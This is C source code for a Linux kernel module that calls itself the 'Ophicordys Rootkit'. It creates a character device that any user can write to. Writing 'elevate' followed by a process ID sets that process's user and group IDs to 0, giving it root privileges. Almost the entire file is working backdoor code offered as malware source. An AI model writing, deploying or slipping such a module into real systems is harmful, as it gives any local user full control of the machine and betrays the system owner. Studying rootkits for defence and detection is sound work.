// Basic LKM functionality
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>

// Work with PIDs
#include <linux/pid.h>

// Create custom LKM driver
#include <linux/fs.h>
#include <linux/cdev.h>

// Modes
#include <linux/stat.h>

// Memset to clear input buffer on write
#include <asm/io.h>

// Defines
#define OPHICORDYS_CLASS_NAME "ophicordys_class"
#define OPHICORDYS_DEVICE_NAME "ophicordys_driver"
#define OPHICORDYS_MAJOR 0
#define OPHICORDYS_CLASS_MODE ((umode_t)(S_IRUGO|S_IWUGO)) // That just means mode 0666
#define OPHICORDYS_BUFFER_SIZE 512
#define OPHICORDYS_OPERATOR_SIZE 16 // Needs to be a lower value then OPHICORDYS_BUFFER_SIZE!
#define DEBUG                       // Comment out line to disable debug messages

// LKM Information
MODULE_AUTHOR("B1TC0R3");
MODULE_DESCRIPTION("Ophicordys Rootkit");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");

// Function Prototypes
int ophicordys_strcmp(char*, char*, size_t);
int handle_command(void);
int elevate_task(int);
int ophicordys_open(struct inode *, struct file *);
ssize_t ophicordys_read(struct file *, char __user *, size_t, loff_t *);
ssize_t ophicordys_write(struct file *, const char *, size_t, loff_t *);
int ophicordys_release(struct inode *, struct file *);

// Structs
static struct class* ophicordys_driver_class = NULL;
static struct device* ophicordys_driver_device = NULL;

const struct file_operations ophicordys_fops = {
    .open = ophicordys_open,
    .read = ophicordys_read,
    .write = ophicordys_write,
    .release = ophicordys_release,
};

// Global variables
static int major;
static char* input_buffer;
static size_t write_counter;
static size_t read_counter;

// Functions
int ophicordys_strcmp(char* a, char* b, size_t size) {
    size_t counter = 0;

    while (counter < size) {
        if (a[counter] != b[counter]) {
            break;
        }

        if ((a[counter] == '\0' && b[counter] == '\0') || (counter + 1) == size) {
            return 1;
        }

        counter++;
    }

    return 0;
}

int handle_command() {
    int read_operator = 1;
    char* current_char = input_buffer;

    char* operator = kmalloc(OPHICORDYS_OPERATOR_SIZE, GFP_KERNEL);
    char* operator_ptr = operator;

    char* opcode = kmalloc(OPHICORDYS_BUFFER_SIZE - OPHICORDYS_OPERATOR_SIZE, GFP_KERNEL);
    char* opcode_ptr = opcode;

    #ifdef DEBUG
    printk(KERN_INFO "%s: Parsing command from: %s\n", THIS_MODULE->name, input_buffer);
    #endif

    while (1) {
        if (*current_char == '\0' || *current_char == '\n' || (current_char - input_buffer) >= OPHICORDYS_BUFFER_SIZE) {
            break;
        }

        if ((operator_ptr - operator) >= OPHICORDYS_OPERATOR_SIZE) {
            #ifdef DEBUG
            printk(KERN_ALERT "%s: Bufferoverflow detected! Aborting command handler.\n", THIS_MODULE->name);
            #endif

            kfree(operator);
            kfree(opcode);
            return 1;
        }

        if (*current_char == ' ') {
            read_operator = 0;
            current_char++;
            continue;
        }

        if (read_operator) {
            *operator_ptr = *current_char;
            operator_ptr++;

        } else {
            *opcode_ptr = *current_char;
            opcode_ptr++;
        }

        current_char++;
    }

    #ifdef DEBUG
    printk(KERN_INFO "%s: Operator: %s | Opcode: %s\n", THIS_MODULE->name, operator, opcode);
    #endif

    if (ophicordys_strcmp(operator, "elevate", OPHICORDYS_OPERATOR_SIZE)) {
        #ifdef DEBUG
        printk(KERN_INFO "%s: Elevating task with pid: %s\n", THIS_MODULE->name, opcode);
        #endif

        unsigned long pid = 0;
        if (kstrtol(opcode, 10, &pid)) {
            #ifdef DEBUG
            printk(KERN_ALERT "%s: Failed to convert opcode to unsigned long.\n", THIS_MODULE->name);
            #endif

            return 1;
        }

        elevate_task((int)(pid & 0x7fffffff));

    }
    #ifdef DEBUG
    else {
        printk(KERN_INFO "%s: Unknown command: %s\n", THIS_MODULE->name, operator);
    }
    #endif

    kfree(operator);
    kfree(opcode);
    return 0;
}

int elevate_task(int pid) {
    struct pid* pid_s = find_get_pid(pid);
    if (!pid_s) {
        #ifdef DEBUG
        printk(KERN_INFO "%s: ERROR: Unable to identify task with PID %i.\n", THIS_MODULE->name, pid);
        #endif
        return 1;
    }

    struct task_struct* task_s = pid_task(pid_s, PIDTYPE_PID);
    if (!task_s) {
        #ifdef DEBUG
        printk(KERN_INFO "%s: ERROR: Unable to generate task struct from PID %i.\n", THIS_MODULE->name, pid);
        #endif
        return 1;
    }

    ((kuid_t*)(&task_s->cred->uid))->val = 0;
    ((kuid_t*)(&task_s->cred->euid))->val = 0;
    ((kuid_t*)(&task_s->cred->suid))->val = 0;
    ((kuid_t*)(&task_s->cred->fsuid))->val = 0;

    ((kuid_t*)(&task_s->cred->gid))->val = 0;
    ((kuid_t*)(&task_s->cred->egid))->val = 0;
    ((kuid_t*)(&task_s->cred->sgid))->val = 0;
    ((kuid_t*)(&task_s->cred->fsgid))->val = 0;
    return 0;
}

int ophicordys_open(struct inode *inode, struct file *file) {
    #ifdef DEBUG
    printk(KERN_INFO "%s: Input device opened.\n", THIS_MODULE->name);
    #endif

    return 0;
}

ssize_t ophicordys_read(struct file *file, char __user *user_buffer, size_t size, loff_t *offset) {
    int errors = 0;

    if(OPHICORDYS_BUFFER_SIZE - *offset < 0){
        #ifdef DEBUG
        printk(KERN_ALERT "%s: Attempted write to outside buffer. Operation aborted.\n", THIS_MODULE->name);
        #endif

        return -EFAULT;
    }

    if (!read_counter) {
        #ifdef DEBUG
        read_counter = 52;
        errors = copy_to_user(user_buffer, "Operation successful, but reading is not intended.\n", read_counter);
        #endif

        #ifndef DEBUG
        read_counter = 1;
        errors = copy_to_user(user_buffer, "\0", read_counter);
        #endif

        if (errors) {
            return -EFAULT;
        }

    } else {
        read_counter = 0;
    }

    return read_counter;
}

ssize_t ophicordys_write(struct file *file, const char *user_buffer, size_t size, loff_t *offset) { 
    if (*offset >= OPHICORDYS_BUFFER_SIZE || OPHICORDYS_BUFFER_SIZE - size < *offset) {
        #ifdef DEBUG
        printk(KERN_ALERT "%s: Attempted write outside buffer. Operation aborted.\n", THIS_MODULE->name);
        #endif

        return -EFAULT;
    }

    memset(input_buffer, 0, OPHICORDYS_BUFFER_SIZE);
    int err = copy_from_user(input_buffer + *offset, user_buffer, size);

    *offset += size;

    if (err) {
        #ifdef DEBUG
        printk(KERN_INFO "%s: Unable to read input from user space.\n", THIS_MODULE->name);
        #endif

        return -EFAULT;
    }

    #ifdef DEBUG
    printk(KERN_INFO "%s: Received input: %s\n", THIS_MODULE->name, input_buffer);
    #endif

    handle_command();

    write_counter = size;
    return write_counter;
}

int ophicordys_release(struct inode *, struct file *) {
    #ifdef DEBUG
    printk(KERN_INFO "%s: Input device closed.\n", THIS_MODULE->name);
    #endif

    return 0;
}

static char* ophicordys_class_devnode(const struct device *dev, umode_t *mode) {
    if (mode) {
        *mode = OPHICORDYS_CLASS_MODE;
    }

    return 0;
}

static int __init ophicordys_init(void) {
    #ifdef DEBUG
    int module_pid = task_pid_nr(current);
    printk(KERN_INFO "%s: Module loaded with PID %i.\n", THIS_MODULE->name, module_pid);
    #endif

    input_buffer = kmalloc(OPHICORDYS_BUFFER_SIZE, GFP_KERNEL);

    major = register_chrdev(
        0,
        OPHICORDYS_DEVICE_NAME,
        &ophicordys_fops
    );

    #ifdef DEBUG
    printk(KERN_INFO "%s: Got major: %i\n", THIS_MODULE->name, major);
    #endif

    if (major < 0) {
        #ifdef DEBUG
        printk(KERN_INFO "%s: Failed to register chrdev with error code: %i\n", THIS_MODULE->name, major);
        #endif

        return major;
    }

    ophicordys_driver_class = class_create(OPHICORDYS_CLASS_NAME);

    if (IS_ERR(ophicordys_driver_class)) {
        class_destroy(ophicordys_driver_class);
        unregister_chrdev(major, OPHICORDYS_CLASS_NAME);

        #ifdef DEBUG
        printk(KERN_ALERT "%s: Failed to create driver class. Aborting.", THIS_MODULE->name);
        #endif

        return 1;
    }

    ophicordys_driver_class->devnode = ophicordys_class_devnode;

    ophicordys_driver_device = device_create(
        ophicordys_driver_class,
        NULL,
        MKDEV(major, 0),
        NULL,
        OPHICORDYS_DEVICE_NAME
    );

    if (IS_ERR(ophicordys_driver_device)) {
        class_destroy(ophicordys_driver_class);
        unregister_chrdev(major, OPHICORDYS_DEVICE_NAME);

        #ifdef DEBUG
        printk(KERN_ALERT "%s: Failed to create driver device. Aborting.", THIS_MODULE->name);
        #endif

        return 1;
    }

    #ifdef DEBUG
    printk(KERN_INFO "%s: Added input device: %s\n", THIS_MODULE->name, OPHICORDYS_DEVICE_NAME);
    #endif

    return 0;
}

static void __exit ophicordys_exit(void) {
    device_destroy(ophicordys_driver_class, MKDEV(major, 0));

    class_unregister(ophicordys_driver_class);
    class_destroy(ophicordys_driver_class);

    unregister_chrdev(major, OPHICORDYS_DEVICE_NAME);

    kfree(input_buffer);

    #ifdef DEBUG
    printk(KERN_INFO "%s: Module unloaded.\n", THIS_MODULE->name);
    #endif
}

module_init(ophicordys_init);
module_exit(ophicordys_exit);
